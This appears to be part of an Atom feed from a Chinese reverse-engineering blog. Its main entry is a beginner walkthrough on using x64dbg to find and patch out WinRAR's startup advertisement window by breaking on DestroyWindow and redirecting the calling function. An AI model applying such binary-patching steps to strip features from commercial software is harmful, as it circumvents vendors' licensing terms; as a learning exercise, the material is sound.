使得OD重新分析代码即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;学习一下基础的软件脱壳，之后慢慢更新&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;upx&quot;&gt;&lt;a href=&quot;#upx&quot; class=&quot;headerlink&quot; title=&quot;upx&quot;&gt;&lt;/a&gt;upx&lt;/h1&gt;&lt;h2 id=&quot;type&quot;&gt;&lt;a href=&quot;#type&quot; clas
      
    
    </summary>
    
      <category term="re" scheme="http://siriuswhiter.tk/categories/re/"/>
    
    
      <category term="re" scheme="http://siriuswhiter.tk/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>Reverse Learning-Practical practice</title>
    <link href="http://siriuswhiter.tk/2019/03/12/reverse-learning-practical-practice/"/>
    <id>http://siriuswhiter.tk/2019/03/12/reverse-learning-practical-practice/</id>
    <published>2019-03-12T14:23:42.000Z</published>
    <updated>2019-03-13T07:54:16.887Z</updated>
    
    <content type="html"><![CDATA[<p><em>这是之前l3c战队逆向的新手训练，本来想以后再搞，但最近又被最为任务下发了，菜的不行，上周什么也没干成，挣扎了一周。还是决定慢慢学习逆向</em></p><h1 id="winRAR-去除广告"><a href="#winRAR-去除广告" class="headerlink" title="winRAR 去除广告"></a>winRAR 去除广告</h1><p>  拿x64dbg做调试器来达到理解原理并去除广告</p><ol><li><p>打开WinRAR，发现开始就有广告弹出；</p></li><li><p>使用x64dbg打开WinRAR，按f9直到程序完全加载，即程序看上去就和普通打开时一样；</p><figure class="image-box">                <img src="/2019/03/12/reverse-learning-practical-practice/1.png" alt="初始状态" title="" class="">                <p>初始状态</p>            </figure></li></ol><ol start="3"><li>命令行输入 bp DestroyWindow  命令，意思就是在DestroyWindow处下断点，然后关掉广告，调试器会停在断点处；<figure class="image-box">                <img src="/2019/03/12/reverse-learning-practical-practice/2.png" alt="断点状态" title="" class="">                <p>断点状态</p>            </figure></li></ol><ol start="4"><li>通过栈回溯到调用destroywindow 函数的地方，往上翻找到消息的开头(关于找到广告窗口子函数的开头，可以向上翻，也可以将其地址减去基址/<em>x64dbg在符号中可以看到基址</em>/得到偏移，将其放入IDA，加上IDA基址，找到函数模块，从而确定开头位置)，将其直接跳转至关闭广告窗口；<figure class="image-box">                <img src="/2019/03/12/reverse-learning-practical-practice/3.png" alt="函数起始" title="" class="">                <p>函数起始</p>            </figure></li></ol><ol start="5"><li>保存patch即可。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;这是之前l3c战队逆向的新手训练，本来想以后再搞，但最近又被最为任务下发了，菜的不行，上周什么也没干成，挣扎了一周。还是决定慢慢学习逆向&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;winRAR-去除广告&quot;&gt;&lt;a href=&quot;#winRAR-去除广告&quot; class=&quot;head
      
    
    </summary>
    
      <category term="re" scheme="http://siriuswhiter.tk/categories/re/"/>
    
    
      <category term="re" scheme="http://siriuswhiter.tk/tags/re/"/>
    
  </entry>
  
</feed>
